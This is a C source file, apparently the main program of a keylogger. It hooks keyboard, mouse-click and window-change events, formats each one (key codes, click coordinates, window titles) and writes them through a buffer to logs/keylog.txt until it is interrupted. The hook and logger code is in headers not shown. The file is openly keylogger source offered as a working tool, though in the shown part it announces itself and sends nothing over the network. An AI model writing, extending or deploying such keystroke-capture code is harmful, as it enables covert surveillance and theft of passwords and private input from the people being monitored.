#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include "hooks.h"
#include "buffer.h"
#include "logger.h"
#include "utils.h"

static volatile int running = 1;

// Callback function for hook events
static void event_callback(const Event* event) {
    if (!event) return;
    
    char event_data[1024];
    switch(event->type) {
        case EVENT_KEY_PRESS:
            snprintf(event_data, sizeof(event_data), "Key Press: %lu\n", 
                    event->data.keyboard.vkCode);
            break;
        case EVENT_MOUSE_CLICK:
            snprintf(event_data, sizeof(event_data), "Mouse Click: (%ld, %ld)\n", 
                    event->data.mouse.position.x, event->data.mouse.position.y);
            break;
        case EVENT_WINDOW_CHANGE:
            snprintf(event_data, sizeof(event_data), "Window Change: %s\n", 
                    event->data.window.title);
            break;
        default:
            return;
    }
    
    add_to_buffer(event_data, strlen(event_data));
}

void cleanup_handler(int signum) {
    running = 0;
}

int main() {
    signal(SIGINT, cleanup_handler);
    signal(SIGTERM, cleanup_handler);

    // Initialize components
    if (!init_hooks(event_callback)) {  // Pass the callback
        fprintf(stderr, "Failed to initialize hooks\n");
        return 1;
    }

    if (!init_buffer()) {
        cleanup_hooks();
        fprintf(stderr, "Failed to initialize buffer\n");
        return 1;
    }

    if (!init_logger("logs/keylog.txt")) {
        cleanup_buffer();
        cleanup_hooks();
        fprintf(stderr, "Failed to initialize logger\n");
        return 1;
    }

    printf("Keylogger started. Press Ctrl+C to exit.\n");

    while (running) {
        process_events();
        flush_buffer_if_needed();
        Sleep(10);
    }

    printf("\nShutting down...\n");
    cleanup_logger();
    cleanup_buffer();
    cleanup_hooks();

    return 0;
}